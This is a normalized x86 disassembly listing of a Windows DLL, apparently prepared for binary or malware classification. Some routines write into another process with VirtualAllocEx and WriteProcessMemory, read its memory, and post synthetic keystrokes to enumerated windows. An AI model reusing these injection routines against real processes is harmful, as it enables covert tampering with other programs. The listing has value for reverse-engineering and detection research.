sub ebx [ ebp - 0x8 ]
push ecx
mov [ ebp - 0x1c ] ebx
fild [ ebp - 0x1c ]
push ecx
fidiv [ ebp - 0xc ]
fstp [ esp ]
push eax
push ebx
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0x18
mov [ ebp - 0xc ] eax
push [ ebp - 0x4 ]
mov eax esi
push [ ebp - 0x10 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
sub_1001fc84
push ebp
mov ebp esp
mov eax 0x1440
call sub_1002e680
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
test edi edi
jle r-xdata
xor eax eax
xor edx edx
inc eax
cmp edi eax
mov ebx edi
mov [ ebp - 0x420 ] edx
mov [ ebp - 0xc30 ] edx
mov [ ebp - 0x1440 ] 0xfffffffe
mov [ ebp - 0x4 ] eax
jl r-xdata
lea edx [ ebp - 0xc2c ]
sub edx ecx
mov esi edi
cmp ebx 0x204
jge r-xdata
mov ecx edi
or eax 0xffffffff
lea edi [ ebp - 0x143c ]
[ edi ]
shl eax 0x8
mov [ edx + ecx ] eax
add ecx 0x4
dec esi
jne r-xdata
inc eax
push 0x7d2
jmp r-xdata
mov edi [ ebp + 0xc ]
xor edx edx
inc edx
xor bl bl
cmp edi edx
jl r-xdata
mov ecx [ ebp - 0xc ]
mov esi [ ebp - 0x8 ]
mov [ ebp - 0x8 ] esi
mov esi [ ecx ]
mov ecx edx
mov eax [ ecx ]
test eax eax
jne r-xdata
call sub_100196de
pop edi
pop esi
pop ebx
leave
retn
lea esi [ ebp - 0x143c ]
mov ecx [ ebp - 0x4 ]
inc edx
lea eax [ ebp + edx * 4 - 0x420 ]
mov [ eax ] ecx
mov eax ecx
mov ecx edx
sar ecx 0x1
mov edi [ ebp + ecx * 4 - 0x420 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov esi [ ecx ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
mov [ ebp - 0xc ] edx
jge r-xdata
cmp edx 0x104
jl r-xdata
mov [ ebp + ecx * 4 - 0x420 ] edi
mov ecx [ ebp - 0x8 ]
mov edi ecx
sar edi 0x1
mov [ ebp - 0x8 ] edi
mov edi [ ebp + edi * 4 - 0x420 ]
cmp esi [ ebp + edi * 4 - 0xc30 ]
jl r-xdata
jmp r-xdata
cmp ecx 0x11
mov eax [ ebp + 0x8 ]
mov [ eax + edx - 0x1 ] cl
jle r-xdata
mov eax esi
cmp edx 0x1
jg r-xdata
push 0x7d1
inc [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0xc ]
jle r-xdata
inc edx
add esi 0x4
cmp edx edi
jle r-xdata
mov bl 0x1
mov eax [ eax ]
lea eax [ ebp + eax * 4 - 0x1440 ]
inc ecx
cmp [ eax ] 0x0
jge r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ ebp + edx * 4 - 0x420 ]
mov [ ebp - 0x10 ] eax
xor eax eax
push 0x2
dec edx
pop esi
inc eax
cmp esi edx
mov [ ebp - 0x41c ] ecx
mov [ ebp - 0x8 ] ecx
jg r-xdata
xor ecx ecx
cmp [ esi ] ecx
jl r-xdata
test bl bl
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] ecx
mov esi [ ebp + edx * 4 - 0x420 ]
mov ecx [ ebp - 0x41c ]
xor eax eax
dec edx
inc eax
cmp edx 0x2
mov [ ebp - 0x41c ] esi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] 0x2
jl r-xdata
mov ecx [ ebp + ecx * 4 - 0xc30 ]
mov [ ebp - 0xc ] ecx
xor esi esi
inc esi
mov esi [ ebp - 0x8 ]
mov [ ebp + eax * 4 - 0x420 ] esi
mov esi [ ebp - 0x10 ]
mov eax ecx
shl eax 0x2
mov ecx [ ebp + eax - 0xc30 ]
shl esi 0x2
inc ebx
mov [ ebp + eax - 0x1440 ] ebx
mov eax [ ebp + esi - 0xc30 ]
mov edi 0xff
mov [ ebp + esi - 0x1440 ] ebx
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x4 ] edi
mov esi eax
and esi edi
mov edi [ ebp - 0x4 ]
cmp esi edi
jle r-xdata
mov esi [ ebp + esi * 4 - 0xc30 ]
cmp [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] esi
mov ecx [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + ecx * 4 - 0xc30 ]
jl r-xdata
mov ecx [ ebp + esi * 4 - 0x41c ]
mov edi [ ebp + esi * 4 - 0x420 ]
mov ecx [ ebp + ecx * 4 - 0xc30 ]
cmp ecx [ ebp + edi * 4 - 0xc30 ]
jge r-xdata
lea ecx [ ebp + esi * 4 - 0xc30 ]
mov eax [ ecx ]
sar eax 0x8
cdq
sub eax edx
sar eax 0x1
inc eax
shl eax 0x8
inc esi
cmp esi edi
mov [ ecx ] eax
jle r-xdata
jmp r-xdata
or [ ebp + ebx * 4 - 0x1440 ] 0xffffffff
mov esi 0xffffff00
and eax esi
and ecx esi
add eax ecx
inc edi
or eax edi
inc edx
mov [ ebp + ebx * 4 - 0xc30 ] eax
lea eax [ ebp + edx * 4 - 0x420 ]
mov ecx edx
sar ecx 0x1
mov [ eax ] ebx
mov esi [ ebp + ecx * 4 - 0x420 ]
mov eax ebx
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp + eax * 4 - 0xc30 ]
mov edi [ ecx ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
mov [ ebp - 0x4 ] edx
jge r-xdata
mov edi esi
mov esi [ ebp - 0x4 ]
mov esi [ ebp + esi * 4 - 0x420 ]
mov edi [ ebp - 0xc ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
mov esi [ ebp - 0x4 ]
shl esi 0x2
mov edi [ ebp + esi - 0x41c ]
mov esi [ ebp + esi - 0x420 ]
mov edi [ ebp + edi * 4 - 0xc30 ]
cmp edi [ ebp + esi * 4 - 0xc30 ]
jge r-xdata
mov [ ebp + eax * 4 - 0x420 ] ecx
mov eax esi
add esi esi
cmp esi edx
jle r-xdata
inc esi
mov ecx [ ebp - 0x4 ]
mov [ ebp + ecx * 4 - 0x420 ] eax
mov ecx [ ecx ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp + eax * 4 - 0x420 ] esi
mov eax [ ebp - 0x4 ]
shl [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x4 ] edx
jle r-xdata
inc [ ebp - 0x4 ]
jge r-xdata
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
sar edi 0x1
mov [ ebp + ecx * 4 - 0x420 ] esi
mov esi [ ebp + edi * 4 - 0x420 ]
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp + esi * 4 - 0xc30 ]
jl r-xdata
jge r-xdata
sub_1001ffc7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
xor ecx ecx
cmp esi [ ebp + 0x14 ]
push edi
mov ebx eax
mov [ ebp - 0x4 ] esi
jg r-xdata
push 0x17
xor eax eax
pop ecx
mov edi edx
[ edi ]
xor ecx ecx
cmp [ ebp + 0x18 ] ecx
jle r-xdata
xor eax eax
cmp [ ebp + 0x18 ] eax
jle r-xdata
xor ecx ecx
inc ecx
movzx eax [ ecx + ebx ]
lea eax [ edx + eax * 4 + 0x4 ]
inc [ eax ]
inc ecx
cmp ecx [ ebp + 0x18 ]
jl r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] eax
jle r-xdata
movzx edi [ eax + ebx ]
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov edi [ edx + ecx * 4 - 0x4 ]
lea eax [ edx + ecx * 4 ]
add [ eax ] edi
inc ecx
cmp ecx 0x17
jl r-xdata
mov edi [ ebp + 0x8 ]
push 0x17
xor eax eax
and [ ebp + 0x18 ] eax
pop ecx
[ edi ]
mov ecx [ ebp + 0x14 ]
cmp esi ecx
jg r-xdata
inc eax
cmp eax [ ebp + 0x18 ]
jl r-xdata
mov edi [ ebp + 0xc ]
mov [ edi + ecx * 4 ] eax
inc ecx
lea eax [ esi + 0x1 ]
cmp eax [ ebp + 0x14 ]
jg r-xdata
mov edi [ ebp + 0x8 ]
sub edi edx
sub ecx esi
lea eax [ edx + esi * 4 ]
mov [ ebp - 0x4 ] edi
inc ecx
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
lea ecx [ ecx + eax * 4 - 0x4 ]
mov ebx [ ebp - 0x4 ]
lea esi [ eax + 0x4 ]
mov edi [ esi ]
sub edi [ eax ]
add [ ebp + 0x18 ] edi
mov edi [ ebp + 0x18 ]
shl [ ebp + 0x18 ] 0x1
dec edi
dec ecx
mov [ ebx + eax ] edi
mov eax esi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov esi [ ecx ]
lea esi [ esi + esi + 0x2 ]
sub esi [ edx + eax * 4 ]
add ecx 0x4
mov [ edx + eax * 4 ] esi
inc eax
cmp eax [ ebp + 0x14 ]
jle r-xdata
sub_100200c5
push 0x7c
mov eax sub_10051634
call sub_1002b2a6
mov esi ecx
test ebx ebx
jne r-xdata
mov eax [ esi + 0x14 ]
push 0x4
push 0x1000
lea edi [ eax + eax ]
push edi
push 0x0
push ebx
call [ VirtualAllocEx@IAT ]
mov [ ebp - 0x14 ] eax
test eax eax
jne r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001ebc
and [ ebp - 0x4 ] ebx
and [ ebp - 0x10 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x88 ]
push eax
call sub_1002ae74
cmp [ ebp - 0x10 ] edi
je r-xdata
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push esi
push eax
push ebx
call [ WriteProcessMemory@IAT ]
cmp eax 0x1
je r-xdata
lea esi [ ebp - 0x1c ]
call sub_100156ab
push r--data
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x4
call sub_10001ebc
lea eax [ ebp - 0x44 ]
push eax
mov eax esi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10015853
push 0x0
push 0x1
lea ecx [ ebp - 0x44 ]
mov esi eax
mov [ ebp - 0x4 ] 0x4
call sub_100020e2
push ebx
call sub_10020281
push [ ebp - 0x14 ]
lea edi [ ebp - 0x28 ]
push esi
push ebx
call sub_10021aa6
push 0xa
mov [ ebp - 0x4 ] 0x6
call [ Sleep@IAT ]
mov eax edi
push eax
call sub_100149a9
mov ecx edi
mov [ ebp - 0x28 ] r--data
call sub_10016c58
call sub_1002b37e
retn
push r--data
lea ecx [ ebp - 0x60 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
sub_10020210
push 0x30
mov eax sub_100522d6
call sub_1002b2a6
mov [ ebp - 0x18 ] r--data
call sub_10015756
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x3c ]
lea eax [ ebp - 0x18 ]
call sub_1001595b
mov esi eax
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_10021bd0
pop ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
mov ebx [ eax + 0x8 ]
mov ecx esi
call sub_100200c5
mov [ ebp - 0x4 ] 0x1
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x3c ]
call sub_1000264e
call sub_1002b37e
retn 0x4
call sub_1000af0a
sub_10020281
push 0x70
mov eax sub_100500f3
call sub_1002b30f
mov eax [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x15
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x38 ] eax
call sub_10005cd0
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] 0x10
mov edi [ ebp - 0x2c ]
jae r-xdata
lea eax [ ebp - 0x34 ]
push eax
push 0x15
push edi
push esi
push [ ebp - 0x38 ]
mov [ ebp - 0x34 ] ebx
call [ ReadProcessMemory@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
cmp ebx 0x1
je r-xdata
lea edi [ ebp - 0x2c ]
cmp [ ebp - 0x34 ] 0x15
je r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
xor ecx ecx
mov eax esi
sub edi esi
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
push r--data
lea ecx [ ebp - 0x54 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
inc ecx
inc eax
cmp ecx 0x15
jl r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea ecx [ ebp - 0x7c ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_1002ae74
mov dl [ edi + eax ]
cmp dl [ eax ]
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_100020e2
call sub_1002b392
retn 0x4
sub_1002034f
push 0x20
mov eax sub_10051da6
call sub_1002b2a6
mov esi [ ebp + 0x8 ]
xor edi edi
push edi
push edi
call sub_10016a10
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push edi
push r--data
push r--data
mov [ ebp - 0x4 ] edi
push edi
mov [ esi ] r--data
call [ CreateWindowExW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] 0x1
call sub_1001486a
pop ecx
pop ecx
push edi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov [ esi + 0x18 ] ebx
mov eax esi
call sub_1002b37e
retn 0x4
sub_10020404
push 0x874
mov eax sub_10052296
call sub_1002b30f
xor esi esi
mov [ ebp - 0x4 ] esi
push edi
mov [ ebp - 0x820 ] ebx
mov [ ebp - 0x81c ] esi
call sub_1001950b
cmp eax 0x197
je r-xdata
lea eax [ ebp - 0x83c ]
push eax
call sub_1002034f
lea eax [ ebp - 0x83c ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10014945
mov eax [ edi + 0x4 ]
push esi
push 0x7
push 0x2eee
push eax
push [ ebp - 0x824 ]
call [ InternetErrorDlg@IAT ]
cmp eax esi
jne r-xdata
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x83c ]
push eax
call sub_100149a9
mov ecx ebx
call sub_10001bdf
lea ecx [ ebx + 0x1c ]
call sub_10001bdf
mov esi 0x800
push esi
lea eax [ ebp - 0x810 ]
push 0x0
push eax
mov [ ebp - 0x81c ] 0x1
mov [ ebp - 0x814 ] esi
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x814 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push 0x2b
push edi
call sub_10019624
lea eax [ ebp - 0x810 ]
push eax
mov ecx ebx
call sub_100014f8
push esi
lea eax [ ebp - 0x810 ]
push 0x0
push eax
mov [ ebp - 0x818 ] esi
call sub_10027650
add esp 0xc
lea eax [ ebp - 0x818 ]
push eax
lea eax [ ebp - 0x810 ]
push eax
push 0x2c
push edi
call sub_10019624
lea eax [ ebp - 0x810 ]
push eax
lea ecx [ ebx + 0x1c ]
call sub_100014f8
lea ecx [ ebp - 0x83c ]
mov [ ebp - 0x4 ] 0x0
call sub_100203e5
mov eax ebx
call sub_1002b392
retn
push r--data
lea ecx [ ebp - 0x858 ]
call sub_10001ebc
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
lea eax [ ebp - 0x858 ]
push eax
lea ecx [ ebp - 0x880 ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x880 ]
push eax
call sub_1002ae74
sub_10020576
push ebx
push ebp
push esi
mov esi [ EnumWindows@IAT ]
push edi
lea ebx [ ecx + 0x18 ]
push ebx
mov edi sub_100205b3
push edi
call esi
mov ebp [ Sleep@IAT ]
jmp r-xdata
cmp eax 0x1
je r-xdata
push 0x1
call ebp
push ebx
push edi
call esi
push 0x1
call ebp
push ebx
push edi
call esi
cmp eax 0x1
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
sub_100205b3
mov eax [ esp + 0x8 ]
push esi
push [ esp + 0x8 ]
mov esi [ eax ]
call [ GetParent@IAT ]
cmp eax esi
pop esi
je r-xdata
push 0x1c0001
push 0xd
push 0x100
push [ esp + 0x10 ]
call [ PostMessageW@IAT ]
dec eax
neg eax
sbb eax eax
neg eax
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_100205ee
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ lstrlenA@IAT ]
mov ebx ecx
mov [ ebp - 0x7c ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x64 ] eax
call edi
xor esi esi
cmp eax esi
ja r-xdata
lea ecx [ ebp - 0x70 ]
push ecx
push eax
push ebx
call sub_1002089d
mov [ ebp - 0x68 ] eax
cmp eax esi
je r-xdata
xor eax eax
push [ ebp - 0x64 ]
call edi
test eax eax
jbe r-xdata
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x64 ]
call sub_10027160
pop ecx
push eax
push [ ebp - 0x64 ]
call sub_1002089d
mov [ ebp - 0x78 ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x5c ]
mov [ ebp - 0x60 ] 0x5
call sub_10020938
push [ ebp - 0x7c ]
mov [ ebp - 0x6c ] esi
call edi
mov edi [ HeapFree@IAT ]
mov ebx [ GetProcessHeap@IAT ]
mov [ ebp - 0x70 ] eax
cmp eax esi
ja r-xdata
push [ ebp - 0x68 ]
push esi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
jmp r-xdata
mov esi [ ebp - 0x7c ]
mov [ ebp - 0x64 ] 0x8
sub [ ebp - 0x64 ] esi
push [ ebp - 0x78 ]
push esi
call ebx
push eax
call edi
push [ ebp - 0x68 ]
push esi
call ebx
push eax
call edi
push [ ebp - 0x68 ]
lea esi [ ebp - 0x60 ]
push [ ebp - 0x74 ]
push [ ebp - 0x78 ]
call sub_10020769
add esp 0xc
xor esi esi
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x60 ]
call sub_10020749
pop ecx
test eax eax
jne r-xdata
inc esi
jmp r-xdata
push [ ebp - 0x78 ]
push 0x0
call ebx
push eax
call edi
push [ ebp - 0x68 ]
push 0x0
call ebx
push eax
call edi
mov eax esi
jmp r-xdata
push [ ebp - 0x78 ]
mov edi [ GetProcessHeap@IAT ]
push 0x0
call edi
mov ebx [ HeapFree@IAT ]
push eax
call ebx
push [ ebp - 0x68 ]
push 0x0
call edi
push eax
call ebx
jmp r-xdata
add [ ebp - 0x6c ] 0x8
mov eax [ ebp - 0x6c ]
add esi 0x8
cmp eax [ ebp - 0x70 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
mov eax [ ebp - 0x64 ]
add eax esi
cmp eax [ ebp - 0x70 ]
ja r-xdata
jmp r-xdata
sub_10020749
cmp [ eax ] 0x5
je r-xdata
push esi
push [ esp + 0x8 ]
lea esi [ eax + 0x4 ]
push 0x8
pop eax
call sub_1002095c
pop ecx
xor eax eax
pop esi
retn
mov eax 0x402
retn
sub_10020769
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x68 ] eax
cmp [ ebp + 0x78 ] 0x80
mov eax [ ebp + 0x7c ]
push ebx
mov [ ebp - 0x54 ] eax
jbe r-xdata
cmp [ esi ] 0x5
je r-xdata
mov ebx 0x406
jmp r-xdata
push edi
lea edi [ esi + 0x4 ]
mov ecx edi
lea ebx [ ebp + 0x54 ]
call sub_10020a01
lea eax [ ebp + 0x54 ]
push eax
push [ esi ]
lea eax [ ebp + 0x30 ]
xor ebx ebx
call sub_1002082c
push [ ebp + 0x78 ]
mov ecx [ ebp - 0x54 ]
push [ ebp + 0x74 ]
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x50 ]
push eax
call sub_10021140
add esp 0x18
test eax eax
je r-xdata
mov ebx 0x402
jmp r-xdata
mov ecx [ ebp + 0x68 ]
mov eax ebx
xor ecx ebp
pop ebx
call sub_10027150
add ebp 0x6c
leave
retn
cmp [ ebp - 0x54 ] 0x22
jne r-xdata
mov ebx 0x40a
jmp r-xdata
mov ebx 0x40b
mov al [ ebp - 0x43 ]
cmp al [ ebp + 0x3d ]
jne r-xdata
pop edi
push 0x22
lea eax [ ebp + 0x30 ]
lea ecx [ ebp - 0x50 ]
call sub_1002087a
pop ecx
test eax eax
jne r-xdata
cmp [ esi ] 0x5
jne r-xdata
mov eax edi
call sub_10020938
jmp r-xdata
sub_1002082c
mov cl [ esp + 0x4 ]
push esi
push edi
mov [ eax + 0xd ] cl
mov ecx rw-data
push 0x4
lea edx [ eax + 0xe ]
pop edi
mov esi ecx
sub edx ecx
mov cl [ esi ]
mov [ edx + esi ] cl
inc esi
dec edi
jne r-xdata
push 0xd
mov ecx rw-data
mov esi eax
pop edi
sub esi ecx
mov dl [ ecx ]
mov [ esi + ecx ] dl
inc ecx
dec edi
jne r-xdata
mov ecx [ esp + 0x10 ]
push 0x10
add eax 0x12
pop esi
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1002087a
push esi
mov esi ecx
movzx ecx [ eax - 0x1 ]
movzx eax [ esi - 0x1 ]
sub eax ecx
pop esi
retn
dec [ esp + 0x8 ]
jne r-xdata
mov dl [ eax ]
mov cl [ esi ]
inc eax
inc esi
cmp cl dl
jne r-xdata
xor eax eax
pop esi
retn
sub_1002089d
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
push esi
push edi
xor esi esi
push r--data
mov [ ebp - 0x4 ] esi
mov [ eax ] esi
call [ LoadLibraryA@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push ebx
push r--data
push edi
call [ GetProcAddress@IAT ]
mov ebx eax
cmp ebx esi
jne r-xdata
xor eax eax
jmp r-xdata
push esi
push esi
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
push edi
call [ FreeLibrary@IAT ]
xor eax eax
jmp r-xdata
pop edi
pop esi
leave
retn 0xc
mov edi esi
call [ GetProcessHeap@IAT ]
push [ ebp - 0x4 ]
push 0x8
push eax
call [ HeapAlloc@IAT ]
mov edi eax
cmp edi esi
je r-xdata
pop ebx
mov eax edi
push esi
push esi
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x1
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
jmp r-xdata
sub_1002095c
push ebp
mov ebp esp
push ecx
mov ecx [ esi + 0x10 ]
push edi
mov edi eax
mov eax ecx
shr eax 0x3
mov edx edi
lea ecx [ ecx + edi * 8 ]
shl edx 0x3
and eax 0x3f
mov [ esi + 0x10 ] ecx
cmp ecx edx
jae r-xdata
push ebx
push 0x40
mov ecx edi
shr ecx 0x1d
add [ esi + 0x14 ] ecx
pop ebx
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
xor ebx ebx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] ebx
lea eax [ eax + esi + 0x18 ]
test ebx ebx
je r-xdata
pop edi
leave
retn
sub eax ecx
lea ecx [ esi + 0x18 ]
push esi
call sub_10020a76
lea eax [ ebx + 0x3f ]
pop ecx
cmp eax edi
jae r-xdata
sub eax ecx
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec edi
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov dl [ ecx ]
mov [ eax + ecx ] dl
inc ecx
dec [ ebp - 0x4 ]
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub edi ebx
lea ecx [ ebx + ecx ]
lea eax [ eax + esi + 0x18 ]
pop ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
lea ecx [ eax + ecx - 0x3f ]
push esi
call sub_10020a76
add [ ebp - 0x4 ] 0x40
add ebx 0x40
pop ecx
cmp [ ebp - 0x4 ] edi
jb r-xdata
sub_10020a01
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov esi ecx
lea edi [ esi + 0x10 ]
push 0x8
pop edx
mov eax edi
lea ecx [ ebp - 0xc ]
call sub_1002110f
mov ecx [ edi ]
shr ecx 0x3
push 0x38
and ecx 0x3f
pop eax
cmp ecx eax
jb r-xdata
sub eax ecx
push rw-data
call sub_1002095c
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop eax
call sub_1002095c
push 0x10
pop edx
mov eax esi
mov ecx ebx
call sub_1002110f
push 0x58
push 0x0
push esi
call sub_10027650
mov ecx [ ebp - 0x4 ]
add esp 0x14
pop edi
xor ecx ebp
pop esi
call sub_10027150
leave
retn
push 0x78
pop eax
sub_10020a76
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub esp 0x48
push ebx
push esi
push edi
push 0x10
add ecx 0x2
lea edx [ ebp - 0x48 ]
pop esi
movzx edi [ ecx + 0x1 ]
movzx ebx [ ecx ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x1 ]
shl edi 0x8
or edi ebx
movzx ebx [ ecx - 0x2 ]
shl edi 0x8
or edi ebx
mov [ edx ] edi
add edx 0x4
add ecx 0x4
dec esi
jne r-xdata
mov esi [ eax + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0xc ]
mov eax [ eax ]
mov edi esi
not edi
and edi ecx
mov ebx edx
and ebx esi
or edi ebx
add edi [ ebp - 0x48 ]
mov ebx esi
lea eax [ edi + eax - 0x28955b88 ]
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x44 ]
lea ecx [ edi + ecx - 0x173848aa ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x40 ]
mov ebx ecx
lea edx [ edi + edx + 0x242070db ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x3c ]
lea esi [ edi + esi - 0x3e423112 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
mov edi edx
and edi [ ebp - 0x4 ]
not esi
and esi ecx
or esi edi
add esi [ ebp - 0x38 ]
lea eax [ esi + eax - 0xa83f051 ]
mov esi [ ebp - 0x4 ]
rol eax 0x7
add eax esi
mov edi eax
not edi
and edi edx
mov ebx esi
and ebx eax
or edi ebx
add edi [ ebp - 0x34 ]
lea ecx [ edi + ecx + 0x4787c62a ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x30 ]
mov ebx ecx
lea edx [ edi + edx - 0x57cfb9ed ]
ror edx 0xf
add edx ecx
mov edi edx
not edi
and edi eax
and ebx edx
or edi ebx
add edi [ ebp - 0x2c ]
lea esi [ edi + esi - 0x2b96aff ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x28 ]
lea eax [ esi + eax + 0x698098d8 ]
mov esi [ ebp - 0x4 ]
mov ebx esi
rol eax 0x7
add eax esi
and ebx eax
mov edi eax
not edi
and edi edx
or edi ebx
add edi [ ebp - 0x24 ]
lea ecx [ edi + ecx - 0x74bb0851 ]
rol ecx 0xc
add ecx eax
mov edi ecx
not edi
and edi esi
mov ebx ecx
and ebx eax
or edi ebx
add edi [ ebp - 0x20 ]
mov ebx ecx
lea edx [ edi + edx - 0xa44f ]
ror edx 0xf
add edx ecx
and ebx edx
mov edi edx
not edi
and edi eax
or edi ebx
add edi [ ebp - 0x1c ]
lea esi [ edi + esi - 0x76a32842 ]
ror esi 0xa
add esi edx
mov [ ebp - 0x4 ] esi
not esi
and esi ecx
mov edi edx
and edi [ ebp - 0x4 ]
or esi edi
add esi [ ebp - 0x18 ]
mov edi [ ebp - 0x4 ]
lea eax [ esi + eax + 0x6b901122 ]
rol eax 0x7
add eax [ ebp - 0x4 ]
and edi eax
mov esi eax
not esi
and esi edx
or esi edi
add esi [ ebp - 0x14 ]
lea ecx [ esi + ecx - 0x2678e6d ]
rol ecx 0xc
